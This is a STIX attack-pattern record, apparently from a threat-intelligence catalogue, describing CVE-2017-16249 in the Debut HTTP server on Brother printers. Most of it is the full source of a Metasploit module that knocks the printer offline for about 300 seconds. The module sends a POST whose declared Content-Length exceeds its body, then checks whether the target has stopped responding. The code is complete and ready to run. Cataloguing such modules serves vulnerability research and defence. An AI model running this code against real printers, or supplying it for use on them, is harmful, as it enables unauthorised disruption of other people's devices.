{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5352bbf5-6ea4-45cd-a1b2-8444b72c9c3e",
    "created": "2024-08-14T16:26:11.620552Z",
    "modified": "2024-08-14T16:26:11.620556Z",
    "name": "Brother Debut http Denial Of Service",
    "description": " The Debut embedded HTTP server <= 1.20 on Brother printers allows for a Denial of Service (DoS) condition via a crafted HTTP request.  The printer will be unresponsive from HTTP and printing requests for ~300 seconds.  After which, the printer will start responding again.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/brother_debut_dos.rb",
            "external_id": "brother_debut_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-16249"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18730"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Brother Debut http Denial Of Service',\n      'Description'    => %q{\n        The Debut embedded HTTP server <= 1.20 on Brother printers allows for a Denial\n        of Service (DoS) condition via a crafted HTTP request.  The printer will be\n        unresponsive from HTTP and printing requests for ~300 seconds.  After which, the\n        printer will start responding again.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n      [\n        'z00n <0xz00n@gmail.com>', # vulnerability disclosure\n        'h00die' # metasploit module\n      ],\n      'References'     => [\n        [ 'CVE', '2017-16249' ],\n        [ 'URL', 'https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18730']\n      ],\n      'DisclosureDate' => '2017-11-02'))\n  end\n\n  def is_alive?\n    res = send_request_raw({\n      'method'\t=> 'GET',\n      'uri'\t=> '/',\n    },10)\n\n    return !res.nil?\n  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE\n    print_error(\"Couldn't connect to #{peer}\")\n  end\n\n  def dos\n    # The web server is single threaded, and when the content length is longer than the data, it will continue to wait\n    # for the rest of the data, which never comes, and times out after ~300 seconds.\n    data = Rex::Text.rand_text_alphanumeric(40)\n    send_request_cgi({\n      'method' => 'POST',\n      'uri'    => '/',\n      'data'   => data, #'asdasdasdasdasdasdasd',\n      'headers' => {\n        # These are kept here since they were in the original exploit, however they are not required\n        #'Host' => 'asdasdasd',\n        #'User-Agent' => 'asdasdasd',\n        #'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n        #'Accept-Language' => 'en-US,en;q=0.5',\n        #'Referer' => 'asdasdasdasd',\n        #'Connection' => 'close',\n         #'Upgrade-Insecure-Requests' => 1,\n        #'Content-Type' => 'application/x-www-form-urlencoded',\n        'Content-Length' => data.length + rand(10) + 10 #42\n        }\n      })\n  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE\n    print_error(\"Couldn't connect to #{peer}\")\n  end\n\n  def run\n    time = Time.new\n    print_status(\"Sending malformed POST request at #{time.strftime(\"%Y-%m-%d %H:%M:%S\")}.\")\n    dos\n\n    # Check to see if it worked or not\n    if is_alive?\n      print_error(\"#{peer} - Server is still alive.\")\n    else\n      print_good(\"#{peer} - Connection Refused: Success! Server will recover about #{(time + 300).strftime(\"%Y-%m-%d %H:%M:%S\")}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-11-02"
}